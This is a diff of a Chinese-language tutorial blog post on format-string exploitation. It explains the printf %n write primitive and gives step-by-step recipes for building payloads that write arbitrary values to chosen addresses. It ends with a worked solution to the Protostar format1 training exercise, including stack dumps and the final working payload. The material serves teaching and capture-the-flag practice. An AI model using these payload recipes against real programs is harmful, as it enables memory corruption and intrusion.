@@ -117,7 +117,7 @@
 
       <div class="read-time">
         <small>
-          2 minute read
+          3 minute read
         </small>
       </div>
 
@@ -148,11 +148,11 @@
 
 <p>4&gt;<code class="highlighter-rouge">printf("%3\$n")</code></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>printf("AAAA%3\$n"):将4(4个A)写入第三个栈里的值指向的内存空间,也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("AAAA%3\$n"):将4(4个A)写入第三个栈里的值指向的内存空间(这一条适用于绝大多数的*nix的系统,win下不支持则用printf("%x,%x,%x")),也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
 </code></pre>
 </div>
 
-<p>0x02 原理理解</p>
+<h3 id="x02-">0x02 原理理解</h3>
 
 <h4 id="refer">1&gt;refer</h4>
 <div class="highlighter-rouge"><pre class="highlight"><code>http://drops.wooyun.org/binary/7714
@@ -184,7 +184,7 @@ int main(void)
 </code></pre>
 </div>
 
-<h4 id="section">栈空间</h4>
+<h4 id="section">3&gt;栈空间</h4>
 
 <p><a href="http://www.cplusplus.com/reference/cstdio/printf/">printf函数</a><br />
 int printf ( const char * format, …  )</p>
@@ -360,15 +360,142 @@ scanf由终端输入%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
 python -c "print '\x88\xf7\xff\xbf'+'%8x%8x%8x%1972x%n'" | ./md
 成功修改了flag的值为2000,打印出了good!
 
-或者更短一些，利用%5\$n(直接参数访问)直接写入到printf第六个参数中
-也即：
+或者更短一些,利用%5\$n(直接参数访问)直接写入到printf第六个参数中
+也即:
 '\x88\xf7\xff\xbf'%1996x%5\$n
 
 python -c "print '\x88\xf7\xff\xbf'+'%1996x%5\$n'" | ./md
 成功修改了flag的值为2000,打印出了good!
 
+</code></pre>
+</div>
 
+<h3 id="x03-">0x03 提炼方法</h3>
 
+<p>环境:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>x32系统下,在call printf这一句汇编语句执行前
+</code></pre>
+</div>
+
+<h4 id="x123456780x40404040">方法1&gt;精确打击:在0x12345678地址中写入0x40404040</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>(适用aslr关闭)
+1&gt;输入python -c "print 'AAAABBBB'+'%8x'*20"
+
+    0.输入python -c "print '%3\$x'"查看是否支持\$
+    
+    1.如果20个栈单元中还没有4141414142424242出现,再将20变大,直到可以看到4141414142424242
+    
+    2.也可以先用gdb加载,在main函数帧中的call printf那一句下断点,然后x/20x $esp,看不到则将20变大,直到可以看到
+    
+    3.计算出AAAABBBB(人工构造的格式化串的起始位置)的出现位置为第几个打印值,假设为第num个,便可知道AAAABBBB的出现位置在
+      栈中相当于第num个printf的参数的位置,便可得到AAAABBBB在栈中的位置与printf的第一个参数的位移差为(num-1)*4
+      (第一个参数为人工构造的格式化串"AAAABBBB%x%x...%x"的指针)
+    
+    4.有时候遇到栈中4141414142424242的位置会随着输入的长度的不同而变化,这时可以在保证输入的长度不变的基础下调整输入的
+      形式(也即调整%x和%n的位置).
+
+2&gt;构造python -c "print 'AA\x78\x56\x34\x12BB'+'%(value-4)x'+'%(num)\$n'"
+
+    这里假设在栈中某一单元中,内容为42424141,也即刚好是AAAABBBB中的中间4个字符覆盖了该栈单元的内容
+    value为需要在0x12345678地址中写入的值0x40404040,value-8=1077952568,假设AAAABBBB中的AABB的出现位置为第6个打印数
+    的位置,也即num=6,则构造如下:
+    
+    python -c "print 'AA\x78\x56\x34\x12BB'+'%1077952568x'+'%5\$n'"
+    
+    如果不支持\$则用:
+    python -c "print 'AA\x78\x56\x34\x12BB'+'%1077952565x'+'%1x'*3+'%n'"
+
+</code></pre>
+</div>
+
+<h4 id="x12345680x40404040">方法2&gt;动态打击:在0x1234568中写入0x40404040</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>(适用于可找到某一栈单元内容为0x12345678的情况,找不到的情况用方法1,该方法可用于aslr开启下)
+
+0&gt;输入python -c "print '%3\$x'"查看是否支持\$
+
+1&gt;找到0x12345678在栈中的位置,用方法1中的两种方法都可以查找(但是如果不是0x12345678这样的比较有特征的可以一眼看出来的,
+  eg.0x40528315,如果需要在栈中查找0x40528315,od中有这个功能,gdb暂不知道,可在使用%x打印栈中数据后尝试用tmux的vim复制
+  模式搜索)
+
+  计算0x12345678在栈中的位置为printf的第几个参数的位置,假设为第32个,也即第31个打印值
+
+2&gt;构造python -c "print '%(value1)x'+'%8x'*29+'%n'"
+      其中value1=1077952576(0x40404040的十进制值)-29*8=1077952344,如下:
+      %1077952344x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n
+  或更短的(需要\$支持):
+      python -c "print '%(value1)x'+'%31\$n'"
+      %1077952576x%31\$n
+
+3&gt;如果不能在栈中某一单元中找到0x12345678而是在连续两个栈单元中存在,eg:
+    --------
+    56341200
+    --------
+    56498078
+    --------
+  这样可以尝试更改输入使0x12345678刚好出现在一个栈中,eg.输入:
+  python -c "print 'B%(value1)x'+'%8x'*29+'%n'"
+  但这不一定有效
+</code></pre>
+</div>
+
+<h3 id="x04-">0x04 小试牛刀</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>target:
+https://exploit-exercises.com/protostar/format1/
+
+source:
+--------------format1.c-----------------
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int target;
+
+void vuln(char *string)
+{
+  printf(string);
+  
+  if(target) {
+      printf("you have modified the target :)\n");
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln(argv[1]);
+}
+-----------------end--------------------
+
+mykey:
+        objdump -t format1
+        find target address:0x8049638
+        ./format1 `python -c "print 'AAAABBBB'+'%x.%x'"`
+        -------------output:--------------
+        AAAABBBB804960c.bffff788
+        --------------end-----------------
+        ./format1 `python -c "print 'AAAABBBB'+'%2\$x'"`
+        ----------------output:----------------
+        AAAABBBB
+        ------------------end------------------
+        结论:这里不能用\$
+        ./format1 `python -c "print 'AAAABBBB'+'%x.'*140"`
+        ---------------output:----------------
+        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7be.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.d5f4313f.ffa7a72f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b4.bffff7be.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.d3000000.e844f82d.2820150f.79187f9d.69c015e8.363836.0.6f662f2e.74616d72.41410031.42424141.78254242.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+        ------------------end-----------------
+        find 42424141 in the 132th print location
+        -----------------output:----------------
+        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7bb.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.b3c0b28e.9993249e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b1.bffff7bb.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.84000000.a999d71b.1ef8a615.f39ada32.69642dc2.363836.662f2e00.616d726f.41003174.42414141.25424242.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
+        --------------------end-----------------
+        find 42414141 in the 131th print location
+        结论:AAAABBBB的在栈中出现的位置会随着输入的长度不同而变化
+        根据./format1 `python -c "print 'AAAABBBB'+'%x.'*140"`中132个输出为42424141:
+        ./format1 `python -c "print 'AA\x38\x96\x04\x08BB'+'%x.'*131+'%n.'+'%x.'*8"`
+        output:
+        .....you have modified the target :)
 </code></pre>
 </div>
 
